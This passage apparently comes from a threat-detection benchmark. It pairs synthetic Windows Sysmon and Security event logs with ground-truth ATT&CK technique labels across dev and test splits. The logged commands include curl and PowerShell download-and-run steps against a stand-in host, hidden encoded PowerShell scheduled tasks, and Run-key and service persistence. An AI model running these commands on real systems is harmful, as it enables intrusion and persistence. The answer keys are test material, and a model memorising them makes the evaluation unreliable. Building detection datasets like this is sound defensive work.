    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_3aff08a5",
    "event_record_id": 70123173568762,
    "fields": {
      "Computer": "WEB01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\curl.exe",
      "ProcessGuid": "{3fc6d2d9-e0fa-d45e-0b0b-adaac0a50cd2}",
      "ProcessId": 11296,
      "TargetFilename": "C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe",
      "User": "mchen",
      "UtcTime": "2026-06-15T06:39:29Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-15T06:39:29Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c curl https://files.example.invalid/cedar_aspen_willow_20c67c/package.exe -o C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe && C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe",
    "Computer": "WEB01",
    "EventID": 4688,
    "NewProcessId": "0x2c1c",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x2c18",
    "SubjectLogonId": "0x2c1d",
    "SubjectUserName": "mchen",
    "TargetUserName": "mchen",
    "TimeCreated": "2026-06-15T06:39:26Z"
  },
  {
    "Computer": "WEB01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\curl.exe",
    "ProcessGuid": "{3fc6d2d9-e0fa-d45e-0b0b-adaac0a50cd2}",
    "ProcessId": 11296,
    "TargetFilename": "C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe",
    "User": "mchen",
    "UtcTime": "2026-06-15T06:39:29Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_D/contextual",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_61e1b572",
        "fields": [
          "CommandLine",
          "NewProcessName"
        ]
      }
    ],
    "T1105": [
      {
        "event_id": "evt_61e1b572",
        "fields": [
          "CommandLine",
          "Computer",
          "SubjectUserName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_3aff08a5",
        "fields": [
          "Computer",
          "TargetFilename",
          "User",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Command-shell execution and the concrete curl transfer each have separate evidence in the contextual view.",
  "technique_ids": [
    "T1059.003",
    "T1105"
  ],
  "technique_names": [
    "Windows Command Shell",
    "Ingress Tool Transfer"
  ],
  "view_id": "view_026cbe9e"
}
```

## pair_a2fd55be
Family: TF_MULTI_DEV_A; split: dev
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_7767b400",
    "event_record_id": 237516559948985,
    "fields": {
      "Computer": "APPSVR01",
      "Details": "C:\\ProgramData\\aspen_maple_fir_a2fd55\\DEV\\agent.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\helper.exe",
      "ProcessGuid": "{d805222f-1cb9-2389-3a2c-16a429e7b1f6}",
      "ProcessId": 4792,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\aspen_maple_fir_a2fd55",
      "User": "jsmith",
      "UtcTime": "2026-04-27T21:41:22Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-04-27T21:41:22Z",
    "windows_event_id": 13
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "APPSVR01",
    "Details": "C:\\ProgramData\\aspen_maple_fir_a2fd55\\DEV\\agent.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\helper.exe",
    "ProcessGuid": "{d805222f-1cb9-2389-3a2c-16a429e7b1f6}",
    "ProcessId": 4792,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\aspen_maple_fir_a2fd55",
    "User": "jsmith",
    "UtcTime": "2026-04-27T21:41:22Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_DEV_A/single",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_7767b400",
        "fields": [
          "Details",
          "TargetObject"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV single view independently supports a Run-key persistence artifact.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_a6f5f118"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_7767b400",
    "event_record_id": 237516559948985,
    "fields": {
      "Computer": "APPSVR01",
      "Details": "C:\\ProgramData\\aspen_maple_fir_a2fd55\\DEV\\agent.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\helper.exe",
      "ProcessGuid": "{d805222f-1cb9-2389-3a2c-16a429e7b1f6}",
      "ProcessId": 4792,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\aspen_maple_fir_a2fd55",
      "User": "jsmith",
      "UtcTime": "2026-04-27T21:41:22Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-04-27T21:41:22Z",
    "windows_event_id": 13
  },
  {
    "channel": "Security",
    "computer": "APPSVR01",
    "event_id": "evt_e280d20a",
    "event_record_id": 61780870690917,
    "fields": {
      "Computer": "APPSVR01",
      "EventID": 4697,
      "ServiceAccount": "LocalService",
      "ServiceFileName": "C:\\ProgramData\\aspen_maple_fir_a2fd55\\DEV\\agent.exe",
      "ServiceName": "Update_aspen_maple_fir_a2fd55",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "APPSVR01",
      "SubjectLogonId": "0x12b9",
      "SubjectUserName": "jsmith",
      "TimeCreated": "2026-04-27T21:41:25Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-27T21:41:25Z",
    "windows_event_id": 4697
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "APPSVR01",
    "Details": "C:\\ProgramData\\aspen_maple_fir_a2fd55\\DEV\\agent.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\helper.exe",
    "ProcessGuid": "{d805222f-1cb9-2389-3a2c-16a429e7b1f6}",
    "ProcessId": 4792,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\aspen_maple_fir_a2fd55",
    "User": "jsmith",
    "UtcTime": "2026-04-27T21:41:22Z"
  },
  {
    "Computer": "APPSVR01",
    "EventID": 4697,
    "ServiceAccount": "LocalService",
    "ServiceFileName": "C:\\ProgramData\\aspen_maple_fir_a2fd55\\DEV\\agent.exe",
    "ServiceName": "Update_aspen_maple_fir_a2fd55",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "APPSVR01",
    "SubjectLogonId": "0x12b9",
    "SubjectUserName": "jsmith",
    "TimeCreated": "2026-04-27T21:41:25Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_DEV_A/contextual",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_7767b400",
        "fields": [
          "Computer"
        ]
      },
      {
        "event_id": "evt_e280d20a",
        "fields": [
          "Computer",
          "ServiceAccount",
          "ServiceFileName"
        ]
      }
    ],
    "T1547.001": [
      {
        "event_id": "evt_7767b400",
        "fields": [
          "Details",
          "TargetObject"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV contextual view supplies separate Run-key and service-install evidence.",
  "technique_ids": [
    "T1547.001",
    "T1543.003"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder",
    "Windows Service"
  ],
  "view_id": "view_3309487e"
}
```

## pair_373770fa
Family: TF_MULTI_DEV_B; split: dev
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_25565c1d",
    "event_record_id": 62430477109045,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4698,
      "SubjectLogonId": "0xbccd",
      "SubjectUserName": "tjones",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Program Files\\PowerShell\\7\\pwsh.exe</Command><Arguments>-File \"C:\\Users\\Public\\elm_yew_larch_373770\\run.ps1\" -Source https://files.example.invalid/elm_yew_larch_373770/package.exe -Destination C:\\ProgramData\\elm_yew_larch_373770\\DEV\\cache\\package.exe</Arguments></Exec></Actions></Task>",
      "TaskName": "\\DEV\\PackageRefresh_elm_yew_larch_373770",
      "TimeCreated": "2026-03-02T06:16:50Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-02T06:16:50Z",
    "windows_event_id": 4698
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 4698,
    "SubjectLogonId": "0xbccd",
    "SubjectUserName": "tjones",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Program Files\\PowerShell\\7\\pwsh.exe</Command><Arguments>-File \"C:\\Users\\Public\\elm_yew_larch_373770\\run.ps1\" -Source https://files.example.invalid/elm_yew_larch_373770/package.exe -Destination C:\\ProgramData\\elm_yew_larch_373770\\DEV\\cache\\package.exe</Arguments></Exec></Actions></Task>",
    "TaskName": "\\DEV\\PackageRefresh_elm_yew_larch_373770",
    "TimeCreated": "2026-03-02T06:16:50Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_DEV_B/single",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_25565c1d",
        "fields": [
          "TaskContent",
          "TaskName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV single view independently supports scheduled-task creation.",
  "technique_ids": [
    "T1053.005"
  ],
  "technique_names": [
    "Scheduled Task"
  ],
  "view_id": "view_454472e5"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_25565c1d",
    "event_record_id": 62430477109045,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4698,
      "SubjectLogonId": "0xbccd",
      "SubjectUserName": "tjones",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Program Files\\PowerShell\\7\\pwsh.exe</Command><Arguments>-File \"C:\\Users\\Public\\elm_yew_larch_373770\\run.ps1\" -Source https://files.example.invalid/elm_yew_larch_373770/package.exe -Destination C:\\ProgramData\\elm_yew_larch_373770\\DEV\\cache\\package.exe</Arguments></Exec></Actions></Task>",
      "TaskName": "\\DEV\\PackageRefresh_elm_yew_larch_373770",
      "TimeCreated": "2026-03-02T06:16:50Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-02T06:16:50Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_d989769b",
    "event_record_id": 52698274635284,
    "fields": {
      "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -File \"C:\\Users\\Public\\elm_yew_larch_373770\\run.ps1\" -Source https://files.example.invalid/elm_yew_larch_373770/package.exe -Destination C:\\ProgramData\\elm_yew_larch_373770\\DEV\\cache\\package.exe",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "LogonGuid": "{a5476c32-7bff-624f-5247-5226325018fc}",
      "LogonId": "0xbccd",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{22ba1ae3-7dda-bf7e-f519-517a22b51fc5}",
      "ParentProcessId": 48328,
      "ProcessGuid": "{2fedc5f0-9e14-b559-345d-73ff0d327c08}",
      "ProcessId": 48336,
      "User": "tjones",
      "UtcTime": "2026-03-02T06:16:53Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-02T06:16:53Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_f940dbfa",
    "event_record_id": 3941544290823,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 11,
      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "ProcessGuid": "{2fedc5f0-9e14-b559-345d-73ff0d327c08}",
      "ProcessId": 48336,
      "TargetFilename": "C:\\ProgramData\\elm_yew_larch_373770\\DEV\\cache\\package.exe",
      "User": "tjones",
      "UtcTime": "2026-03-02T06:16:56Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-02T06:16:56Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 4698,
    "SubjectLogonId": "0xbccd",
    "SubjectUserName": "tjones",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Program Files\\PowerShell\\7\\pwsh.exe</Command><Arguments>-File \"C:\\Users\\Public\\elm_yew_larch_373770\\run.ps1\" -Source https://files.example.invalid/elm_yew_larch_373770/package.exe -Destination C:\\ProgramData\\elm_yew_larch_373770\\DEV\\cache\\package.exe</Arguments></Exec></Actions></Task>",
    "TaskName": "\\DEV\\PackageRefresh_elm_yew_larch_373770",
    "TimeCreated": "2026-03-02T06:16:50Z"
  },
  {
    "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -File \"C:\\Users\\Public\\elm_yew_larch_373770\\run.ps1\" -Source https://files.example.invalid/elm_yew_larch_373770/package.exe -Destination C:\\ProgramData\\elm_yew_larch_373770\\DEV\\cache\\package.exe",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "LogonGuid": "{a5476c32-7bff-624f-5247-5226325018fc}",
    "LogonId": "0xbccd",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{22ba1ae3-7dda-bf7e-f519-517a22b51fc5}",
    "ParentProcessId": 48328,
    "ProcessGuid": "{2fedc5f0-9e14-b559-345d-73ff0d327c08}",
    "ProcessId": 48336,
    "User": "tjones",
    "UtcTime": "2026-03-02T06:16:53Z"
  },
  {
    "Computer": "WORKSTATION01",
    "EventID": 11,
    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "ProcessGuid": "{2fedc5f0-9e14-b559-345d-73ff0d327c08}",
    "ProcessId": 48336,
    "TargetFilename": "C:\\ProgramData\\elm_yew_larch_373770\\DEV\\cache\\package.exe",
    "User": "tjones",
    "UtcTime": "2026-03-02T06:16:56Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_DEV_B/contextual",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_25565c1d",
        "fields": [
          "TaskContent",
          "TaskName"
        ]
      }
    ],
    "T1059.001": [
      {
        "event_id": "evt_25565c1d",
        "fields": [
          "Computer",
          "TaskContent",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_d989769b",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "UtcTime"
        ]
      }
    ],
    "T1105": [
      {
        "event_id": "evt_d989769b",
        "fields": [
          "CommandLine",
          "Computer",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_f940dbfa",
        "fields": [
          "Computer",
          "ProcessGuid",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV contextual view independently supports the task object, PowerShell execution, and transfer artifact.",
  "technique_ids": [
    "T1053.005",
    "T1059.001",
    "T1105"
  ],
  "technique_names": [
    "Scheduled Task",
    "PowerShell",
    "Ingress Tool Transfer"
  ],
  "view_id": "view_e6cd0172"
}
```

## pair_275a9f88
Family: TF_T1053_005_A; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_c65e57ac",
    "event_record_id": 102035348192510,
    "fields": {
      "Computer": "DB01",
      "EventID": 4698,
      "SubjectLogonId": "0x10225",
      "SubjectUserName": "admin.svc",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAcwBoAF8AdwBpAGwAbABvAHcAXwAyADcANQBhADkAZgAnAA==</Arguments><WorkingDirectory>C:\\Users\\Public\\holly_ash_willow_275a9f</WorkingDirectory></Exec></Actions></Task>",
      "TaskName": "\\Windows\\UpdateCheck_holly_ash_willow_275a9f",
      "TimeCreated": "2026-06-24T02:03:48Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-24T02:03:48Z",
    "windows_event_id": 4698
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 4698,
    "SubjectLogonId": "0x10225",
    "SubjectUserName": "admin.svc",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAcwBoAF8AdwBpAGwAbABvAHcAXwAyADcANQBhADkAZgAnAA==</Arguments><WorkingDirectory>C:\\Users\\Public\\holly_ash_willow_275a9f</WorkingDirectory></Exec></Actions></Task>",
    "TaskName": "\\Windows\\UpdateCheck_holly_ash_willow_275a9f",
    "TimeCreated": "2026-06-24T02:03:48Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_A/single",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_c65e57ac",
        "fields": [
          "TaskContent",
          "TaskName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The task-created event contains the task object, hidden PowerShell payload, and suspicious payload location in one visible record.",
  "technique_ids": [
    "T1053.005"
  ],
  "technique_names": [
    "Scheduled Task"
  ],
  "view_id": "view_b9420a21"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_c65e57ac",
    "event_record_id": 102035348192510,
    "fields": {
      "Computer": "DB01",
      "EventID": 4698,
      "SubjectLogonId": "0x10225",
      "SubjectUserName": "admin.svc",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAcwBoAF8AdwBpAGwAbABvAHcAXwAyADcANQBhADkAZgAnAA==</Arguments><WorkingDirectory>C:\\Users\\Public\\holly_ash_willow_275a9f</WorkingDirectory></Exec></Actions></Task>",
      "TaskName": "\\Windows\\UpdateCheck_holly_ash_willow_275a9f",
      "TimeCreated": "2026-06-24T02:03:48Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-24T02:03:48Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_d43e9317",
    "event_record_id": 242868101211691,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAcwBoAF8AdwBpAGwAbABvAHcAXwAyADcANQBhADkAZgAnAA==",
      "Computer": "DB01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{079e7d9f-d0de-afa2-1721-7ba919599c86}",
      "LogonId": "0x10225",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{2f051033-1ff5-74e1-92d2-e61b37d05b61}",
      "ParentProcessId": 66080,
      "ProcessGuid": "{dce322e6-662b-b03e-fe23-47910caaf591}",
      "ProcessId": 66088,
      "User": "admin.svc",
      "UtcTime": "2026-06-24T02:03:51Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-24T02:03:51Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 4698,
    "SubjectLogonId": "0x10225",
    "SubjectUserName": "admin.svc",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAcwBoAF8AdwBpAGwAbABvAHcAXwAyADcANQBhADkAZgAnAA==</Arguments><WorkingDirectory>C:\\Users\\Public\\holly_ash_willow_275a9f</WorkingDirectory></Exec></Actions></Task>",
    "TaskName": "\\Windows\\UpdateCheck_holly_ash_willow_275a9f",
    "TimeCreated": "2026-06-24T02:03:48Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAcwBoAF8AdwBpAGwAbABvAHcAXwAyADcANQBhADkAZgAnAA==",
    "Computer": "DB01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{079e7d9f-d0de-afa2-1721-7ba919599c86}",
    "LogonId": "0x10225",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{2f051033-1ff5-74e1-92d2-e61b37d05b61}",
    "ParentProcessId": 66080,
    "ProcessGuid": "{dce322e6-662b-b03e-fe23-47910caaf591}",
    "ProcessId": 66088,
    "User": "admin.svc",
    "UtcTime": "2026-06-24T02:03:51Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_A/contextual",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_c65e57ac",
        "fields": [
          "Computer",
          "TaskContent",
          "TaskName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_d43e9317",
        "fields": [
          "Computer",
          "Image",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The later process-creation record matches the executable and arguments configured in the task. This is consistent with payload invocation, but these records alone do not establish that Task Scheduler launched it or that the payload completed.",
  "technique_ids": [
    "T1053.005"
  ],
  "technique_names": [
    "Scheduled Task"
  ],
  "view_id": "view_95560f6e"
}
```

## pair_018e3624
Family: TF_T1053_005_B; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_358cd0a2",
    "event_record_id": 97500176546790,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4698,
      "SubjectLogonId": "0xfd69",
      "SubjectUserName": "jsmith",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\oak_larch_ash_018e36\\agent.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
      "TaskName": "\\CacheRefresh_oak_larch_ash_018e36",
      "TimeCreated": "2026-05-03T00:41:54Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-03T00:41:54Z",
    "windows_event_id": 4698
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WEB01",
    "EventID": 4698,
    "SubjectLogonId": "0xfd69",
    "SubjectUserName": "jsmith",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\oak_larch_ash_018e36\\agent.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
    "TaskName": "\\CacheRefresh_oak_larch_ash_018e36",
    "TimeCreated": "2026-05-03T00:41:54Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_B/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_358cd0a2",
        "fields": [
          "TaskContent",
          "TaskName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "A COM-created task and an unknown ProgramData executable are dual-use; intent is not established in the single view.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_37c1dc0f"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_358cd0a2",
    "event_record_id": 97500176546790,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4698,
      "SubjectLogonId": "0xfd69",
      "SubjectUserName": "jsmith",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\oak_larch_ash_018e36\\agent.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
      "TaskName": "\\CacheRefresh_oak_larch_ash_018e36",
      "TimeCreated": "2026-05-03T00:41:54Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-03T00:41:54Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_4d732c35",
    "event_record_id": 22641866754008,
    "fields": {
      "CommandLine": "C:\\ProgramData\\oak_larch_ash_018e36\\agent.exe",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=a16c2ed87d161cf143e24df8b15be94fe2c835e470f810977c0e75aed2db8549",
      "Image": "C:\\ProgramData\\oak_larch_ash_018e36\\agent.exe",
      "LogonGuid": "{435316e7-03ae-9335-ca8e-e7ccc3a52e9b}",
      "LogonId": "0xfd69",
